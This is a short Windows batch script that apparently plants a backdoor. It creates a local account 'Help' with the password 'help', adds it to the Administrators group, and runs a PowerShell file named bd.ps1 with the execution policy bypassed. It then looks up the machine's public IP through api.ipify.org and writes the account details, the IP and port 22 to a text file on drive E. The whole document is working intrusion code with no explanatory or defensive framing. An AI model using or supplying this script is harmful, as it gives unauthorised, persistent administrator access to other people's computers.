@echo off
net user "Help" "help" /add
net localgroup "Administrators" "Help" /add
Powershell -ExecutionPolicy Bypass -File E:\bd.ps1
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo %DATE%%TIME% >> E:\output.txt
echo Username: Help >> E:\output.txt
echo Password: help >> E:\output.txt
echo Public IP: %PublicIP% >> E:\output.txt
echo Port: 22>> E:\output.txt
